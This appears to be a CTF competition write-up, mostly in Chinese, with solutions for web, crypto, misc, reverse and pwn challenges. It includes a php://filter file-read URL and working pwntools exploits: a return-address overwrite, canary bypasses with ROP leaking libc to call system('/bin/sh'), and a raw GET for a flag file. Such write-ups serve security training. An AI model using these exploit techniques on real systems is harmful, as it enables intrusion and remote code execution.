## WEB
#### babysqliv1.0/V2.0/v3.0 pingpingping 禁止套娃 BabyUpload 报菜名：

发到www.gem-love.com

#### HardCore PHP和随便注 

网上wp

#### 我flag呢？

view-source:http://imagin.vip:10053/config1.php?file=php://filter/read=string.rot13/resource=flag.php

## Crypto

#### 1.checkin

先base64再ROT

#### 2.md5

直接解密

#### 3.变异凯撒

根据flag的格式为flag{}，和afZ_r9VYfScOeO_UL^RWUc，分别差5,6,7,8。推测此差值依次递增

```python
astring = 'afZ_r9VYfScOeO_UL^RWUc'

tmp = ''
for j in range(len(astring)):
	tmp += chr(ord(astring[j]) + j + 5)

print(tmp)
```

## MISC

#### 1.QR

Photoshop

#### 2.BabyNC

340282366920938463463374607

#### 3.佛系青年

zip伪加密+与佛论禅

#### 4.SXMgdGhpcyBiYXNlPw==

base64隐藏信息跑脚本即可：

```python
import base64

b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('bbb.txt', 'rb') as f:
    flag = ''
    bin_str = ''
    for line in f.readlines():
        stegb64 = str(line, "utf-8").strip("\n")
        rowb64 =  str(base64.b64encode(base64.b64decode(stegb64)), "utf-8").strip("\n")
        offset = abs(b64chars.find(stegb64.replace('=','')[-1]) - b64chars.find(rowb64.replace('=','')[-1]))
        equalnum = stegb64.count('=') #no equalnum no offset
        if equalnum:
            bin_str += bin(offset)[2:].zfill(equalnum * 2)
            #flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))
            #print(flag) 这样写得不出正确结果
        print([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)])
```

#### 5.gakki

先binwalk分离出rar 然后爆破密码好像是8864还是什么 解压txt后统计字频：

```
 g 2221 2.6299
6 a 2087 2.4713
7 k 1981 2.3457
8 i 1797 2.1279
    _   1531
9 I 1448 1.7146
10 s 1402 1.6601
11 M 1398 1.6554
12 y 1389 1.6447
13 w 1386 1.6412
14 1 1376 1.6293
15 f 1373 1.6258
16 e 1372 1.6246
17 }
```

#### 6.流量

下载压缩包，解压，因为是easy liuliang所以把后缀名改成pccap导入wireshark，发现http流量多，分析后发现让search 'hnt.txt'，发现一串HTMLENCODE解密得到f1ag{}变型flag{}

## Re

#### SimpleCPP

这个题主要是hexbox[]数组， hint给了hexbox[1]和hexbox[3]异或后的结果了，就算出*hexbox和hexbox[2]之后和iwillcheckdebugger字符串异或，最后把结果和hint给出来的两部分拼起来

#### lucky_guy

f1在程序中就有，f2在case4,5中生成。

```c
#include <stdio.h>

int main()
{
    char s[20] = "\x69\x63\x75\x67\x60\x6f\x66";
    char v1;
    for (int j = 0; j <= 6; ++j) {
        if (j % 2 ==1)
            v1 = *(s+j) - 2;
        else
            v1 = *(s+j) - 1;    
        *(s+j) = v1;
    }
    printf("%s\n", s);
    return 0;
}
```

## PWN

#### fantasy

首先`checksec`

![fantasy](C:\Users\liu\Desktop\Notes\images\fantasy.png)

然后ida发现，在`vul`函数中读入超限，所以可以直接覆盖返回地址，执行`fantasy`函数获得shell。exp如下：

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

# io = process("./fantasy")
io = remote("172.21.4.12", 10101)

payload = "a" * 0x38 + p64(0x400735)

io.sendline(payload)
io.interactive()
```

#### My_cannary

此题的解决流程包括：绕过canary+ROP获得shell

这道题直接ida发现`judge`函数无法反编译，所以使用`objdump -d my_cannary > asm.s`命令，直接看的汇编。可以发现整体的逻辑，在main函数中调用welcome函数生成随机数作为canary，而后调用test函数将随机数传入，存储在了`ebp-0x8`处，分配了一个空间备份了一下canary，将此空间的地址存储在ebp-0x10处，然后调用了read函数，这里存在溢出点。test函数的最后调用check函数，检查canary是否损坏。

在welcome函数中，可以发现一个gift变量，此为一个未初始化的全局变量。

##### 绕过canary

将ebp-0x10处的地址改为gift全局变量的地址，ebp-0x8处覆盖为0。

##### ROP获得shell

将puts函数的真实地址输出，再使用libcsearcher库，获取system函数地址和/bin/sh的地址。

exp.py

```python
from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
io = process("./my_cannary")
io = remote("172.21.4.12", 10102)
elf = ELF("./my_cannary")

# f = open("inputfile", "wb")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
system_plt = elf.plt['system']

popret = 0x400a43
mainaddr = 0x400998

payload1 = 'a' * 0x30 + p64(0x6010C0) + p64(0x0) + p64(0x0) + p64(popret) + p64(puts_got) + p64(puts_plt) + p64(mainaddr)

io.recvuntil("begin\n")
io.sendline(payload1)
puts_addr = u64(io.recv(6).ljust(8, '\x00'))
# print(hex(puts_addr))

libc = LibcSearcher("puts", puts_addr)
libcbase = puts_addr - libc.dump("puts")
binsh_addr = libcbase + libc.dump("str_bin_sh")
system_addr = libcbase + libc.dump("system")

payload2 = 'a' * 0x30 + p64(0x6010C0) + p64(0x0) + p64(0x0) + p64(popret) + p64(binsh_addr) + p64(system_addr)

io.recvuntil("begin\n")
io.sendline(payload2)
io.interactive()
```

#### blind_note

checksec发现程序开启了canary保护。

ida可以发现create函数存在溢出行为，通过create不断地向上覆盖栈。但是存在canary保护，所以得考虑绕过canary。在show函数发现，没有检查日记index是否为负数，就确定偏移，利用它来输出canary值。

在程序中，输入66可以得到puts函数的真实地址，据此可以ROP得到shell。exp如下

```python
from pwn import *
from LibcSearcher import *
import ctypes

def create(num):
    io.recvuntil(">\n")
    io.sendline("1")
    io.sendline(str(num))

context(arch="amd64", os="linux", log_level="debug")

# io = process("./blind_note")
io = remote("172.21.4.12", 10103)

elf = ELF("./blind_note")
main_addr = elf.sym["main"]
popret = 0x400c63


# add a number to position 0
create(123)
# io.recvuntil(">\n")
# io.sendline("1")
# io.sendline("123")

# recv the puts_addr and calculate addr
io.recvuntil(">\n")
io.sendline("66")
io.recvuntil("This is my id:")
puts_addr = u64(io.recv(6).ljust(8, "\x00"))

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

# get canary
io.recvuntil(">\n")
io.sendline("2")
io.recvuntil("which one ?\n")
io.sendline("-10")
io.recvuntil("note num is : ")
canary1 = ctypes.c_uint32(int(io.recvline()))
print(canary1.value)

io.recvuntil(">\n")
io.sendline("2")
io.recvuntil("which one ?\n")
io.sendline("-9")
io.recvuntil("note num is : ")
canary2 = ctypes.c_uint32(int(io.recvline()))
print(canary2.value)

# padding and rop
for i in range(25):
    create(123)

create(canary1.value)
create(canary2.value)
create(123)
create(123)

create(popret & 0xffffffff)
create(popret >> 32)
create(binsh_addr & 0xffffffff)
create(binsh_addr >> 32)
create(system_addr & 0xffffffff)
create(system_addr >> 32)

io.interactive()
```

#### Terrible_httpd

这题主要是读懂就行了。

简略的一个网页服务器程序，只要读取到flag文件就行了。

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

io = remote("172.21.4.12", 10104)

io.sendline("GET ./flag \n")
print(io.recvall())

```



